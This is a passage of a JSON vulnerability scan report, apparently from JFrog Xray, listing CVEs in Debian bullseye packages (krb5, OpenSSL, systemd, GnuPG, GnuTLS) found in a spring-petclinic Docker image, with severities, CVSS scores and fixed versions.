         "source_comp_id": "deb://debian:bullseye:libkrb5-3:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u4"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-36054",
                     "cwe": [
                        "CWE-824"
                     ],
                     "cwe_details": {
                        "CWE-824": {
                           "name": "Access of Uninitialized Pointer",
                           "description": "The product accesses or uses a pointer that has not been initialized."
                        }
                     },
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "lib/kadm5/kadm_rpc_xdr.c in MIT Kerberos 5 (aka krb5) before 1.20.2 and 1.21.x before 1.21.1 frees an uninitialized pointer. A remote authenticated user can trigger a kadmind crash. This occurs because _xdr_kadm5_principal_ent_rec does not validate the relationship between n_key_data and the key_data array count.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-36054",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-527466",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "lib/kadm5/kadm_rpc_xdr.c in MIT Kerberos 5 (aka krb5) before 1.20.2 and 1.21.x before 1.21.1 frees an uninitialized pointer. A remote authenticated user can trigger a kadmind crash. This occurs because _xdr_kadm5_principal_ent_rec does not validate the relationship between n_key_data and the key_data array count.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgssapi-krb5-2",
         "source_id": "deb://debian:bullseye:libgssapi-krb5-2",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u4"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-36054",
                     "cwe": [
                        "CWE-824"
                     ],
                     "cwe_details": {
                        "CWE-824": {
                           "name": "Access of Uninitialized Pointer",
                           "description": "The product accesses or uses a pointer that has not been initialized."
                        }
                     },
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "lib/kadm5/kadm_rpc_xdr.c in MIT Kerberos 5 (aka krb5) before 1.20.2 and 1.21.x before 1.21.1 frees an uninitialized pointer. A remote authenticated user can trigger a kadmind crash. This occurs because _xdr_kadm5_principal_ent_rec does not validate the relationship between n_key_data and the key_data array count.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-36054",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-527466",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "lib/kadm5/kadm_rpc_xdr.c in MIT Kerberos 5 (aka krb5) before 1.20.2 and 1.21.x before 1.21.1 frees an uninitialized pointer. A remote authenticated user can trigger a kadmind crash. This occurs because _xdr_kadm5_principal_ent_rec does not validate the relationship between n_key_data and the key_data array count.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libk5crypto3",
         "source_id": "deb://debian:bullseye:libk5crypto3",
         "source_comp_id": "deb://debian:bullseye:libk5crypto3:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u4"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-36054",
                     "cwe": [
                        "CWE-824"
                     ],
                     "cwe_details": {
                        "CWE-824": {
                           "name": "Access of Uninitialized Pointer",
                           "description": "The product accesses or uses a pointer that has not been initialized."
                        }
                     },
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "lib/kadm5/kadm_rpc_xdr.c in MIT Kerberos 5 (aka krb5) before 1.20.2 and 1.21.x before 1.21.1 frees an uninitialized pointer. A remote authenticated user can trigger a kadmind crash. This occurs because _xdr_kadm5_principal_ent_rec does not validate the relationship between n_key_data and the key_data array count.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-36054",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-527005",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. After fixing\nCVE-2023-3446 it was discovered that a large q parameter value can also trigger\nan overly long computation during some of these checks. A correct q value,\nif present, cannot be larger than the modulus p parameter, thus it is\nunnecessary to perform these checks if q is larger than p.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulnerable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the \"-check\" option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:openssl:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1v-0~deb11u1"
            ],
            "fixed_versions": [
               "1.1.1v-0~deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-3817",
                     "cwe": [
                        "CWE-834"
                     ],
                     "cwe_details": {
                        "CWE-834": {
                           "name": "Excessive Iteration",
                           "description": "The product performs an iteration or loop without sufficiently limiting the number of times that the loop is executed."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Issue summary: Checking excessively long DH keys or parameters may be very slow.  Impact summary: Applications that use the functions DH_check(), DH_check_ex() or EVP_PKEY_param_check() to check a DH key or DH parameters may experience long delays. Where the key or parameters that are being checked have been obtained from an untrusted source this may lead to a Denial of Service.  The function DH_check() performs various checks on DH parameters. After fixing CVE-2023-3446 it was discovered that a large q parameter value can also trigger an overly long computation during some of these checks. A correct q value, if present, cannot be larger than the modulus p parameter, thus it is unnecessary to perform these checks if q is larger than p.  An application that calls DH_check() and supplies a key or parameters obtained from an untrusted source could be vulnerable to a Denial of Service attack.  The function DH_check() is itself called by a number of other OpenSSL functions. An application calling any of those other functions may similarly be affected. The other functions affected by this are DH_check_ex() and EVP_PKEY_param_check().  Also vulnerable are the OpenSSL dhparam and pkeyparam command line applications when using the \"-check\" option.  The OpenSSL SSL/TLS implementation is not affected by this issue.  The OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-3817",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-527005",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. After fixing\nCVE-2023-3446 it was discovered that a large q parameter value can also trigger\nan overly long computation during some of these checks. A correct q value,\nif present, cannot be larger than the modulus p parameter, thus it is\nunnecessary to perform these checks if q is larger than p.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulnerable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the \"-check\" option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1v-0~deb11u1"
            ],
            "fixed_versions": [
               "1.1.1v-0~deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-3817",
                     "cwe": [
                        "CWE-834"
                     ],
                     "cwe_details": {
                        "CWE-834": {
                           "name": "Excessive Iteration",
                           "description": "The product performs an iteration or loop without sufficiently limiting the number of times that the loop is executed."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Issue summary: Checking excessively long DH keys or parameters may be very slow.  Impact summary: Applications that use the functions DH_check(), DH_check_ex() or EVP_PKEY_param_check() to check a DH key or DH parameters may experience long delays. Where the key or parameters that are being checked have been obtained from an untrusted source this may lead to a Denial of Service.  The function DH_check() performs various checks on DH parameters. After fixing CVE-2023-3446 it was discovered that a large q parameter value can also trigger an overly long computation during some of these checks. A correct q value, if present, cannot be larger than the modulus p parameter, thus it is unnecessary to perform these checks if q is larger than p.  An application that calls DH_check() and supplies a key or parameters obtained from an untrusted source could be vulnerable to a Denial of Service attack.  The function DH_check() is itself called by a number of other OpenSSL functions. An application calling any of those other functions may similarly be affected. The other functions affected by this are DH_check_ex() and EVP_PKEY_param_check().  Also vulnerable are the OpenSSL dhparam and pkeyparam command line applications when using the \"-check\" option.  The OpenSSL SSL/TLS implementation is not affected by this issue.  The OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-3817",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-526117",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. One of those\nchecks confirms that the modulus ('p' parameter) is not too large. Trying to use\na very large modulus is slow and OpenSSL will not normally use a modulus which\nis over 10,000 bits in length.\n\nHowever the DH_check() function checks numerous aspects of the key or parameters\nthat have been supplied. Some of those checks use the supplied modulus value\neven if it has already been found to be too large.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulernable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the '-check' option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:openssl:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1v-0~deb11u1"
            ],
            "fixed_versions": [
               "1.1.1v-0~deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-3446",
                     "cwe": [
                        "CWE-1333"
                     ],
                     "cwe_details": {
                        "CWE-1333": {
                           "name": "Inefficient Regular Expression Complexity",
                           "description": "The product uses a regular expression with an inefficient, possibly exponential worst-case computational complexity that consumes excessive CPU cycles."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Issue summary: Checking excessively long DH keys or parameters may be very slow.  Impact summary: Applications that use the functions DH_check(), DH_check_ex() or EVP_PKEY_param_check() to check a DH key or DH parameters may experience long delays. Where the key or parameters that are being checked have been obtained from an untrusted source this may lead to a Denial of Service.  The function DH_check() performs various checks on DH parameters. One of those checks confirms that the modulus ('p' parameter) is not too large. Trying to use a very large modulus is slow and OpenSSL will not normally use a modulus which is over 10,000 bits in length.  However the DH_check() function checks numerous aspects of the key or parameters that have been supplied. Some of those checks use the supplied modulus value even if it has already been found to be too large.  An application that calls DH_check() and supplies a key or parameters obtained from an untrusted source could be vulernable to a Denial of Service attack.  The function DH_check() is itself called by a number of other OpenSSL functions. An application calling any of those other functions may similarly be affected. The other functions affected by this are DH_check_ex() and EVP_PKEY_param_check().  Also vulnerable are the OpenSSL dhparam and pkeyparam command line applications when using the '-check' option.  The OpenSSL SSL/TLS implementation is not affected by this issue. The OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-3446",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-526117",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. One of those\nchecks confirms that the modulus ('p' parameter) is not too large. Trying to use\na very large modulus is slow and OpenSSL will not normally use a modulus which\nis over 10,000 bits in length.\n\nHowever the DH_check() function checks numerous aspects of the key or parameters\nthat have been supplied. Some of those checks use the supplied modulus value\neven if it has already been found to be too large.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulernable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the '-check' option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1v-0~deb11u1"
            ],
            "fixed_versions": [
               "1.1.1v-0~deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-3446",
                     "cwe": [
                        "CWE-1333"
                     ],
                     "cwe_details": {
                        "CWE-1333": {
                           "name": "Inefficient Regular Expression Complexity",
                           "description": "The product uses a regular expression with an inefficient, possibly exponential worst-case computational complexity that consumes excessive CPU cycles."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Issue summary: Checking excessively long DH keys or parameters may be very slow.  Impact summary: Applications that use the functions DH_check(), DH_check_ex() or EVP_PKEY_param_check() to check a DH key or DH parameters may experience long delays. Where the key or parameters that are being checked have been obtained from an untrusted source this may lead to a Denial of Service.  The function DH_check() performs various checks on DH parameters. One of those checks confirms that the modulus ('p' parameter) is not too large. Trying to use a very large modulus is slow and OpenSSL will not normally use a modulus which is over 10,000 bits in length.  However the DH_check() function checks numerous aspects of the key or parameters that have been supplied. Some of those checks use the supplied modulus value even if it has already been found to be too large.  An application that calls DH_check() and supplies a key or parameters obtained from an untrusted source could be vulernable to a Denial of Service attack.  The function DH_check() is itself called by a number of other OpenSSL functions. An application calling any of those other functions may similarly be affected. The other functions affected by this are DH_check_ex() and EVP_PKEY_param_check().  Also vulnerable are the OpenSSL dhparam and pkeyparam command line applications when using the '-check' option.  The OpenSSL SSL/TLS implementation is not affected by this issue. The OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-3446",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-416709",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A timing based side channel exists in the OpenSSL RSA Decryption implementation\nwhich could be sufficient to recover a plaintext across a network in a\nBleichenbacher style attack. To achieve a successful decryption an attacker\nwould have to be able to send a very large number of trial messages for\ndecryption. The vulnerability affects all RSA padding modes: PKCS#1 v1.5,\nRSA-OEAP and RSASVE.\n\nFor example, in a TLS connection, RSA is commonly used by a client to send an\nencrypted pre-master secret to the server. An attacker that had observed a\ngenuine connection between a client and a server could use this flaw to send\ntrial messages to the server and record the time taken to process them. After a\nsufficiently large number of messages the attacker could recover the pre-master\nsecret used for the original connection and thus be able to decrypt the\napplication data sent over that connection.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u4"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-4304",
                     "cwe": [
                        "CWE-203"
                     ],
                     "cwe_details": {
                        "CWE-203": {
                           "name": "Observable Discrepancy",
                           "description": "The product behaves differently or sends different responses under different circumstances in a way that is observable to an unauthorized actor, which exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not."
                        }
                     },
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A timing based side channel exists in the OpenSSL RSA Decryption implementation which could be sufficient to recover a plaintext across a network in a Bleichenbacher style attack. To achieve a successful decryption an attacker would have to be able to send a very large number of trial messages for decryption. The vulnerability affects all RSA padding modes: PKCS#1 v1.5, RSA-OEAP and RSASVE.  For example, in a TLS connection, RSA is commonly used by a client to send an encrypted pre-master secret to the server. An attacker that had observed a genuine connection between a client and a server could use this flaw to send trial messages to the server and record the time taken to process them. After a sufficiently large number of messages the attacker could recover the pre-master secret used for the original connection and thus be able to decrypt the application data sent over that connection.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-4304",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-416709",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A timing based side channel exists in the OpenSSL RSA Decryption implementation\nwhich could be sufficient to recover a plaintext across a network in a\nBleichenbacher style attack. To achieve a successful decryption an attacker\nwould have to be able to send a very large number of trial messages for\ndecryption. The vulnerability affects all RSA padding modes: PKCS#1 v1.5,\nRSA-OEAP and RSASVE.\n\nFor example, in a TLS connection, RSA is commonly used by a client to send an\nencrypted pre-master secret to the server. An attacker that had observed a\ngenuine connection between a client and a server could use this flaw to send\ntrial messages to the server and record the time taken to process them. After a\nsufficiently large number of messages the attacker could recover the pre-master\nsecret used for the original connection and thus be able to decrypt the\napplication data sent over that connection.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:openssl:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u4"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-4304",
                     "cwe": [
                        "CWE-203"
                     ],
                     "cwe_details": {
                        "CWE-203": {
                           "name": "Observable Discrepancy",
                           "description": "The product behaves differently or sends different responses under different circumstances in a way that is observable to an unauthorized actor, which exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not."
                        }
                     },
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A timing based side channel exists in the OpenSSL RSA Decryption implementation which could be sufficient to recover a plaintext across a network in a Bleichenbacher style attack. To achieve a successful decryption an attacker would have to be able to send a very large number of trial messages for decryption. The vulnerability affects all RSA padding modes: PKCS#1 v1.5, RSA-OEAP and RSASVE.  For example, in a TLS connection, RSA is commonly used by a client to send an encrypted pre-master secret to the server. An attacker that had observed a genuine connection between a client and a server could use this flaw to send trial messages to the server and record the time taken to process them. After a sufficiently large number of messages the attacker could recover the pre-master secret used for the original connection and thus be able to decrypt the application data sent over that connection.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-4304",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-412203",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in systemd. This security flaw can cause a local information leak due to systemd-coredump not respecting the fs.suid_dumpable kernel setting.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsystemd0",
         "source_id": "deb://debian:bullseye:libsystemd0",
         "source_comp_id": "deb://debian:bullseye:libsystemd0:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "< 247.3-7+deb11u2"
            ],
            "fixed_versions": [
               "247.3-7+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-4415",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A vulnerability was found in systemd. This security flaw can cause a local information leak due to systemd-coredump not respecting the fs.suid_dumpable kernel setting.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-4415",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-412203",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in systemd. This security flaw can cause a local information leak due to systemd-coredump not respecting the fs.suid_dumpable kernel setting.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libudev1",
         "source_id": "deb://debian:bullseye:libudev1",
         "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "< 247.3-7+deb11u2"
            ],
            "fixed_versions": [
               "247.3-7+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-4415",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A vulnerability was found in systemd. This security flaw can cause a local information leak due to systemd-coredump not respecting the fs.suid_dumpable kernel setting.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-4415",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-230074",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "GnuPG through 2.3.6, in unusual situations where an attacker possesses any secret-key information from a victim's keyring and other constraints (e.g., use of GPGME) are met, allows signature forgery via injection into the status line.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:gpgv",
         "source_id": "deb://debian:bullseye:gpgv",
         "source_comp_id": "deb://debian:bullseye:gpgv:2.2.27-2+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:gnupg2",
            "vulnerable_versions": [
               "< 2.2.27-2+deb11u2"
            ],
            "fixed_versions": [
               "2.2.27-2+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-34903",
                     "cwe": [
                        "CWE-74"
                     ],
                     "cwe_details": {
                        "CWE-74": {
                           "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
                           "description": "The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component."
                        }
                     },
                     "cvss_v2": "5.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:N",
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
                  }
               ],
               "description": "GnuPG through 2.3.6, in unusual situations where an attacker possesses any secret-key information from a victim's keyring and other constraints (e.g., use of GPGME) are met, allows signature forgery via injection into the status line.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-34903",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-199549",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A NULL pointer dereference flaw was found in GnuTLS. As Nettle's hash update functions internally call memcpy, providing zero-length input may cause undefined behavior. This flaw leads to a denial of service after authentication in rare circumstances.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgnutls30",
         "source_id": "deb://debian:bullseye:libgnutls30",
         "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
         "component_versions": {
            "id": "debian:bullseye:gnutls28",
            "vulnerable_versions": [
               "< 3.7.1-5+deb11u1"
            ],
            "fixed_versions": [
               "3.7.1-5+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-4209",
                     "cwe": [
                        "CWE-476"
                     ],
                     "cwe_details": {
                        "CWE-476": {
                           "name": "NULL Pointer Dereference",
